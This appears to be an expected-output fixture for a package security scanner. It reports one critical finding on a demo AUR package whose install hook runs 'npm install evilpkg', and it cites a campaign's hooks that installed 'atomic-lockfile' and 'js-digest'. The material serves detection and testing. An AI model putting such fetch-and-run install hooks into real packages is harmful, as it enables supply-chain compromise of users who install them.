@@ -1,0 +1,20 @@
+
+Scan Results: demo-git
+============================================================
+
+[CRITICAL] ATOMIC-002 Node/Bun package manager in install hook (install script)
+    Invokes npm/pnpm/yarn/bun (or the npx/bunx runners) to install or run packages from an install hook. The June 2026 'Atomic Arch' campaign added post-install hooks running `npm install atomic-lockfile` / `bun install js-digest`. Legitimate packages never fetch or execute npm/bun packages during the install phase. `npm ci`, `npm rebuild`, `npm exec`, `pnpm dlx`, `yarn dlx`, and the bare `npx <pkg>` / `bunx <pkg>` runners all fetch-and-run lifecycle/remote code just like `install`.
+    Location: tests/fixtures/malicious/install-declare-operator/demo.scr:2
+    Code:   npm install evilpkg
+    Recommendation: Install scripts must never fetch or install npm/bun packages. Inspect the PKGBUILD diff and report the package to the AUR maintainers.
+    Reference: CWE-494
+
+
+
+============================================================
+Package: demo-git v1-1
+Scan duration: 19ms
+
+Found 1 issue(s):
+  1 CRITICAL
+============================================================
